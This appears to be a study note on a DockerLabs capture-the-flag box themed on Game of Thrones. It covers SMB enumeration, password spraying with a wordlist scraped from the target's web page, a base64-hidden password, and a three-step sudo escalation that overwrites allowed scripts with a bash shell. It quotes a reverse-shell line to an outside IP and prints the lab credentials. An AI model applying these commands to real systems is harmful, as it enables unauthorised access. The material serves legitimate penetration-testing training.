---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, smbmap, nxc, enum4linux, smbclient, gobuster, curl, ssh]
techniques: [information-gathering, smb-enumeration, directory-fuzzing, encoded-credentials, sudo-abuse]
tags: [ejpt:assessment, ejpt:host-net-pentest]
related: ["[[domain]]", "[[dance-samba]]", "[[winfake]]"]
---

# Winterfell

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/winterfell.md)

A Game-of-Thrones themed box where rockyou fails and **the web page *is* the wordlist**: Season 1 episode titles with spaces stripped (the note apologizes: *"Tengo la barra espaciadora estropeada"*) crack jon's SMB password. Root then comes from a **three-hop sudo chain** where every hop is the same primitive — overwrite a file the next user is allowed to execute or read.

## Path

1. **Recon** — `ping` + `nmap -p- --open -sS --min-rate 5000` → **22** (OpenSSH 9.2p1 Debian) + **80** (Apache 2.4.61, title *"Juego de Tronos"*) + **139/445** (Samba 4) ([[information-gathering]], [[nmap]]).
2. **Null-session SMB** — `smbmap -H` lists `print$`, `shared`, `IPC$`, `nobody`, **all `NO ACCESS`** unauthenticated; `nxc smb --users` reports **jon** (1 user), while `enum4linux | grep 'Local User'` walks the SIDs and returns **jon, aria, daenerys, nobody** — the full cast → saved to `users.txt` ([[smb-enumeration]], [[smbmap]], [[nxc]], [[enum4linux]]).
3. **Spray, fail, pivot** — `nxc smb -u users.txt -p rockyou.txt` finds nothing ([[nxc]]).
4. **The web has the wordlist** — gobuster → `dragon/` (301) → `curl http://172.17.0.2/dragon/EpisodiosT1`:

   ```
   Estos son todos los Episodios de la primera  temporada de Juego de tronos.
   Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

   seacercaelinvierno
   elcaminoreal
   lordnieve
   tullidosbastardosycosasrotas
   elloboyelleon
   unacoronadeoro
   ganasomueres
   porelladodelapunta
   baelor
   fuegoyhielo
   ```

   Ten S1 titles, spaces stripped → `curl -s ... | tail -n 10 > ep.txt` ([[directory-fuzzing]], [[gobuster]], [[curl]]).
5. **Target-derived spray** — `nxc smb 172.17.0.2 -u users.txt -p ep.txt` → **`jon:seacercaelinvierno`** ("winter is coming") on the first list that fits the box's theme ([[nxc]]).
6. **Authenticated shares** — `smbmap` flips `shared` to **READ, WRITE** (`print$` and `jon`'s home to READ ONLY); `smbclient //172.17.0.2/shared -U "jon%seacercaelinvierno"` pulls `proteccion_del_reino`: a note assigning Aria the task of delivering an encrypted message to Daenerys, ending with *"Esta es mi contraseña … aGlqb2RlbGFuaXN0ZXI="* → `echo … | base64 -d` → **`hijodelanister`** → `ssh jon@172.17.0.2` ([[smbclient]], [[encoded-credentials]], [[ssh]]).
7. **Three hops, one primitive** ([[sudo-abuse]]):
   - **jon → aria** — `sudo -l` → `(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py` → back up the pinned script, overwrite it with `os.execl("/bin/bash", "bash")` → `sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py` → aria.
   - **aria → daenerys** — `(daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls` → `ls`/`cat` **as daenerys** — a *file-read primitive*, not a shell: `.secret/.shell.sh` is a dead reverse shell (`bash -i >& /dev/tcp/192.168.234.42/443`), `mensajeParaJon` leaks `!drakaris!` → `su daenerys` ([[dance-samba]]'s `file -f` family).
   - **daenerys → root** — `(ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh` → overwrite the root-executed script with `/bin/bash -p` → `sudo -u root /usr/bin/bash …/.shell.sh` → `whoami` → `root`.

## Credentials / secrets

| Secret | Where it came from |
|--------|--------------------|
| `jon:seacercaelinvierno` | SMB spray with `ep.txt` — episode titles scraped from `/dragon/EpisodiosT1` |
| `hijodelanister` | base64 inside `proteccion_del_reino` (SMB share note) — implied as jon's SSH password |
| daenerys's password | leaked in `mensajeParaJon` as `!drakaris!`, read via `sudo -u daenerys cat` (the `su` transcript shows `drakaris` — variant unexplained) |

## Takeaways

- **When rockyou fails, the target writes its own wordlist.** The spray wasn't wrong — it just wasn't *themed*. The page author staged ten passwords in plain sight with a broken-spacebar excuse; theme boxes give theme passwords (cf. [[winfake]]'s acrostic). Enumerate the web *before* burning a full rockyou run.
- **`NO ACCESS` is a phase, not a verdict.** The null session showed zero readable shares; one valid pair flipped `shared` to READ,WRITE. Always re-check permissions authenticated ([[smb-enumeration]]).
- **Enum tools disagree — run both.** `nxc --users` reported only jon; enum4linux's SID walk found `aria` and `daenerys` too. Same divergence as [[chmod-4755]]: one enum tool is never enough.
- **`sudo cat`/`ls` is a privesc primitive.** The rule grants no shell, yet `cat` as daenerys read a password straight to `su` — a file-read sudo entry is a credential leak, and credentials are a hop ([[dance-samba]], [[dockerlabs-box]]).
- **Every hop is the same move:** overwrite a sudo-allowed file — a pinned Python script, then the script root executes. Three rules, three overwrites, no GTFOBins one-liner needed after hop 1 ([[sudo-abuse]]).
- **"Encrypted in an ancient language" was base64.** Narrative framing is not cryptography — check the trivial decoders before assuming a hash ([[encoded-credentials]]).

## Gaps in the writeup

- **No flags on record** — the transcript ends at `whoami` → `root`; no `root.txt`/`user.txt` path appears anywhere (jon's home is never browsed for one).
- **The `su` password variant is unexplained** — the note leaks `!drakaris!`, the transcript shows `drakaris` typed with no failure or retry between them. Which string actually worked is not shown.
- **The dead reverse shell's target is never investigated** — `192.168.234.42:443` appears inside `.shell.sh` and is never mentioned again (whose listener? reachable? relevant?).
- **The READ-ONLY shares were never opened.** Authenticated `smbmap` exposed `print$` and jon's home share (READ ONLY) — only `shared` was pulled via `smbclient`; the home share could hold the flag the transcript never hunts for.
- **`.mensaje.py`'s original contents are never shown** — the pinned script was backed up and replaced, but what it originally did (send the message?) is never read.
- **aria's home is never enumerated** — `ls`/`cat` ran only against daenerys's files; aria's own directory (visible via `sudo -l`'s rule set) was skipped. `server-status` (403) also left unprobed.
